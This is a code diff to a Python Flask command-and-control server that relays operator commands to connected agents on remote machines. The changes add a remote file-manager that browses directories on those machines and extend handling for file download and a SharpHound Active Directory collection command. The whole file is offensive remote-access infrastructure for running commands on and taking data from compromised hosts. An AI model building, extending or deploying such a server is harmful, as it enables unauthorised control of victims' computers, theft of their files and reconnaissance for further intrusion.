@@ -1,4 +1,6 @@
 from concurrent.futures import thread
+from gzip import READ
+
 from os import close
 import os
 import re
@@ -17,15 +19,24 @@ port_number = 1234
 thread_index = 0
 THREADS = []
 CMD_INPUT = []
+FILE_INPUT = []
 CMD_OUTPUT = []
+FILE_OUTPUT=[]
 IPS = []
+CWD=[]
 BUFFER_SIZE = 4096*10
+CURRENT_WORKING_DIR = "D:\\python\\c2_yt"
+GOT_OUTPUT = 0
 
-for i in range(20):
+
+for i in range(50):
     #THREADS.append('')
     CMD_INPUT.append('')
     CMD_OUTPUT.append('')
+    FILE_INPUT.append('')
+    FILE_OUTPUT.append('')
     IPS.append('')
+    CWD.append('.')
 
 app = Flask(__name__)
 
@@ -51,9 +62,20 @@ def handle_connection(connection,address,thread_index):
             #msg = connection.recv(BUFFER_SIZE).decode()
         CMD_OUTPUT[thread_index] = msg
         while True:
-            if CMD_INPUT[thread_index]!='':
-                    
-                if CMD_INPUT[thread_index].split(" ")[0]=='download':
+            if CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='':
+
+
+                if FILE_INPUT[thread_index]!='':
+                    # getdirectorycontents-directoryname
+                    msg = "getdirectorycontents-"+FILE_INPUT[thread_index]
+                    connection.send(msg.encode())
+                    print(FILE_INPUT[thread_index])
+                    msg = connection.recv(BUFFER_SIZE).decode()
+                    GOT_OUTPUT=1
+                    FILE_OUTPUT[thread_index] = msg
+                    FILE_INPUT[thread_index]=''
+
+                elif CMD_INPUT[thread_index].split(" ")[0]=='download':
                         #download filename
                         filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                         print(filename)
@@ -145,6 +167,7 @@ def handle_connection(connection,address,thread_index):
                     #CMD_OUTPUT[thread_index] = msg
                     break
             
+            
     close_connection(connection,thread_index)
 
 
@@ -170,6 +193,16 @@ def init_server():
     s1 = threading.Thread(target=server_socket)
     s1.start()
 
+@app.route("/<agentname>/stuff")
+def random(agentname):
+    try:
+        for i in THREADS:
+                if agentname in i.name:
+                    temp = THREADS.index(i)
+        cmdoutput = CMD_OUTPUT[temp]
+        return jsonify(result=cmdoutput)
+    except:
+        return render_template('index.html')
 
 
 @app.route("/")
@@ -199,7 +232,7 @@ def execute(agentname):
             if agentname in i.name:
                 req_index = THREADS.index(i)
         prev = CMD_OUTPUT[req_index]
-        print("previous value->"+prev)
+        #print("previous value->"+prev)
         CMD_INPUT[req_index]=cmd
         #time.sleep(2)
         if cmd=="Get-SharpHoundZip":
@@ -217,7 +250,7 @@ def execute(agentname):
             cmdoutput = CMD_OUTPUT[req_index]
             #counter = 0
         cmdoutput = CMD_OUTPUT[req_index]
-        print("Latest value->"+cmdoutput)
+        #print("Latest value->"+cmdoutput)
         return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
     if request.method=='POST':
         cmd = request.form['command']
@@ -237,7 +270,9 @@ def execute(agentname):
         if counter>0:
             cmdoutput = CMD_OUTPUT[req_index]
             counter=0
-        return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)
+        return ('',204)
+        #return Response(status=200)
+        #return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)
 
 
 #@app.route("/<agentname")
@@ -246,7 +281,81 @@ def execute(agentname):
 
 @app.route("/temp",methods=['GET','POST'])
 def temp():
-    return render_template("execute.html")
+    l =[['D',"test"],['F', 'LICENSE.txt'], ['F', 'NEWS.txt'], ['F', 'python.exe'], ['F', 'python3.dll'], ['F', 'python39.dll'], ['F', 'pythonw.exe'], ['F', 'vcruntime140.dll'], ['F', 'vcruntime140_1.dll']]
+    if request.method=="POST":
+        print(request.form.getlist("checkbox2"))
+    return render_template("checkbox.html",cwd=os.getcwd(),data=l)
+
+
+@app.route("/temp/<dirname>",methods=["GET","POST"])
+def tempup(dirname):
+    #print(CURRENT_WORKING_DIR)
+    directory_name = request.args.get('data')
+    if (request.args.get('data')=="D:" or request.args.get('data')=="D:\\") and dirname=="up":
+        CURRENT_WORKING_DIR = "D:\\"
+        files = os.listdir(CURRENT_WORKING_DIR)
+        #print(files)
+        l=[]
+        for i in range(len(files)):
+            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
+                l.append(["D",files[i]])
+            else:
+                l.append(["F",files[i]])
+        print(l)
+        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)
+    
+    if dirname=="up":
+        CURRENT_WORKING_DIR = directory_name
+        CURRENT_WORKING_DIR = "\\".join(CURRENT_WORKING_DIR.split("\\")[0:-1])
+        files = os.listdir(CURRENT_WORKING_DIR)
+        #print(files)
+        l=[]
+        for i in range(len(files)):
+            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
+                l.append(["D",files[i]])
+            else:
+                l.append(["F",files[i]])
+        print(l)
+        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)    
+    l = []
+    CURRENT_WORKING_DIR = request.args.get('data') + "\\"+dirname
+    files = os.listdir(CURRENT_WORKING_DIR)
+    print(files)
+    l=[]
+    for i in range(len(files)):
+        if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
+            l.append(["D",files[i]])
+        else:
+            l.append(["F",files[i]])
+    print(l)
+    return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)
+
+
+@app.route("/<agentname>/file-manager",methods=["GET","POST"])
+def filemanager(agentname): 
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    if request.args.get('data'):
+        print("previous dir"+CWD[req_index])
+        print(str(request.args.get('data')))
+        
+        FILE_INPUT[req_index] = CWD[req_index][0:-1 ]  +"\\"+ str(request.args.get('data'))
+        print("latest input "+FILE_INPUT[req_index])
+    else:
+        FILE_INPUT[req_index]="."
+    #cwd = FILE_INPUT[req_index] = "."
+    time.sleep(1)
+    print(FILE_OUTPUT[req_index])
+    fileoutput = FILE_OUTPUT[req_index].split('\n')
+    print(fileoutput[0])
+    CWD[req_index] = fileoutput[0]
+    fileoutput = fileoutput[1:]
+    for i in range(len(fileoutput)):
+        fileoutput[i]=list(fileoutput[i].split("->"))
+    return render_template("filemanager.html",cwd=CWD[req_index],fileoutput=fileoutput,agentname=agentname)
+    #pass 
+ 
 
 if __name__=='__main__':
     app.run(debug=True)
